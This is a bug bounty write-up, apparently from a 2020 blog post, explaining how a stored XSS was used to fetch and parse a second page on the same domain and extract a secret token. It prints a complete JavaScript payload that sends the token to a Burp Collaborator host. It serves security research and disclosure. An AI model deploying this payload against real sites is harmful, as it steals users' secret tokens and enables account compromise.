---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-05-22_parsing-the-dom-elements-of-other-pages-via-xss-a-bug-bounty-story.md
original_filename: 2020-05-22_parsing-the-dom-elements-of-other-pages-via-xss-a-bug-bounty-story.md
title: 'Parsing the DOM elements of Other pages via XSS: A Bug Bounty Story'
category: documents
detected_topics:
- xss
- access-control
- command-injection
- otp
- csrf
- information-disclosure
tags:
- imported
- documents
- xss
- access-control
- command-injection
- otp
- csrf
- information-disclosure
language: en
raw_sha256: fc6ab8a8f10ba2e75faaf135ec1fe13140b411bf15d01fab03d1b34d1f4caa0b
text_sha256: 89115e6a9870c3d70c06c42ad89e54362f36ac656f54cc1e1ea37e932c5f7380
ingested_at: '2026-06-28T07:32:02Z'
sensitivity: unknown
redactions_applied: false
---

# Parsing the DOM elements of Other pages via XSS: A Bug Bounty Story

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-05-22_parsing-the-dom-elements-of-other-pages-via-xss-a-bug-bounty-story.md
- Source Type: markdown
- Detected Topics: xss, access-control, command-injection, otp, csrf, information-disclosure
- Ingested At: 2026-06-28T07:32:02Z
- Redactions Applied: False
- Raw SHA256: `fc6ab8a8f10ba2e75faaf135ec1fe13140b411bf15d01fab03d1b34d1f4caa0b`
- Text SHA256: `89115e6a9870c3d70c06c42ad89e54362f36ac656f54cc1e1ea37e932c5f7380`


## Content

---
title: "Parsing the DOM elements of Other pages via XSS: A Bug Bounty Story"
url: "https://medium.com/@ciph3r7r0ll/parsing-the-dom-elements-of-other-pages-via-xss-bug-bounty-story-46d517e6711d"
authors: ["Mandeep Jadon (@1337tr0lls)"]
bugs: ["XSS", "Information disclosure"]
publication_date: "2020-05-22"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4567
scraped_via: "browseros"
---

# Parsing the DOM elements of Other pages via XSS: A Bug Bounty Story

Parsing the DOM elements of Other pages via XSS: A Bug Bounty Story
Mandeep Jadon
Follow
3 min read
·
May 23, 2020

80

1

Hi everyone . I hope everyone is safe in this tough period of lockdown.

In this writeup I want to share with you all one of my bug bounty stories that I encountered last year . I did not find any writeup corresponding to this scenario so thought of writing about it . This may be already known to many but can be an additional knowledge for others .

Quite a few times we encounter that during pentest/bug bounties , we get unmasked sensitive information that is displayed to the user (ie. the person himself sees his personal information in plaintext ( Email , tokens , PII information ) . We do report this in pentest , but in bug bounties the chances of it being accepted are pretty low . It may get you a small bounty in some cases .

In my scenario I was getting a secret token reflected back without masking . decided not to report it and started searching for ways to leak it to the attacker .

After few days of spending on the target I found an XSS on the same domain .

In the past , the things that I achieved with XSS was : stealing DOM information , Stealing cookies / CSRF tokens to perform unintended actions related to authorization and some other related stuff . This is what the intent of most of the people reporting XSS is .

The problem here was the information disclosure was on a different page than XSS. I somehow need to frame the payload that would steal the token from another page ( of the same domain obviously) and send it to my server . Lets suppose the secret token in somewhere in the DOM element of this URL :

https://victim.com/User/token

and our token can be obtained from the DOM as :

var token = doc.getElementsByClassName(“out-text”)[23].textContent.split(“,”)[0].slice(234)

(This was actually the place where my token was :p )

So lets start building up our payload .

We start with creating basic xhr object and call the ‘open’ method with our affected URL .

Get Mandeep Jadon’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

<script>
var xhr = new XMLHttpRequest();
xhr.open(‘GET’, ‘https://victim.com/User/token’, true);

Now that we have the xhr object with the affected url we call the onload method of the same object to do all the magic :)

Here is an interesting thing to note . Usually when you have script control over a page , you have control over the current DOM and you are able to read all the current DOM elements . The context of the script is confined to the current DOM . In order to read the response returned from the other requests of a different page (same domain ) through the JS on the same page you need a parser ( Like BeautifulSoup in python ) . The current page is already parsed so we can directly access the DOM elements without specifying any parser . Thankfully Javascript has a builtin parser which I came to know after bit googling and stackoverflow . :)

So we get the response text via responseText method of the previous xhr object . ( This is exactly same as BeautifulSoup right ? )

xhr.onload = function () {
var parser = new DOMParser();
var doc = parser.parseFromString(xhr.responseText, “text/html”);

Then we get the token from the “runtime DOM “ ( I would like to call it ) that we created .

var token= doc.getElementsByClassName(“out-text”)[23].textContent.split(“,”)[0].slice(234)

Then we shoot the request to the attacker domain with the stolen token .

var request = new XMLHttpRequest();
request.open(‘GET’, ‘https://xxxxxxxxxxxxxxxxxxxxxxx.burpcollaborator.net/?token='+token, true);
request.send();

}

So our final payload becomes :

<script>
var xhr = new XMLHttpRequest();
xhr.open(‘GET’, ‘https://victim.com/User/token’, true);
xhr.onload = function () {
var request = new XMLHttpRequest();
var parser = new DOMParser();
var doc = parser.parseFromString(xhr.responseText, “text/html”);
var token= doc.getElementsByClassName(“out-text”)[23].textContent.split(“,”)[0].slice(234);
request.open(‘GET’, ‘https://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.burpcollaborator.net/?token='+token, true);
request.send()
};
xhr.send();
</script>

This was a stored XSS actually so whenever victim visits the page , his token gets leaked at the attackers server .

TIP : Use requestbin in place of BURP collaborator for POC purpose , so that the client can see the leak himself . Its fun to watch 😁

Thanks Paresh , Rahul and Rakesh for proofreading 😎

Thanks for reading . Keep learning . Keep hunting and Stay safe and Healthy 😇
